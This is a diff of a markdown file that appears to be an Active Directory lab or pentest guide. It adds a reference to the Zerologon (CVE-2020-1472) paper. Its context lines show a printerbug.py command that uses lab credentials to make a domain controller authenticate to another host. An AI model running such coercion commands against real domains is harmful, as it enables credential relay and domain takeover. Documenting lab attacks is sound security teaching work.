@@ -99,3 +99,8 @@ The following prerequisites are needed:
   #Trigger printerbug in 2nd shell
   python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
   ```
+
+
+## References
+
+* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
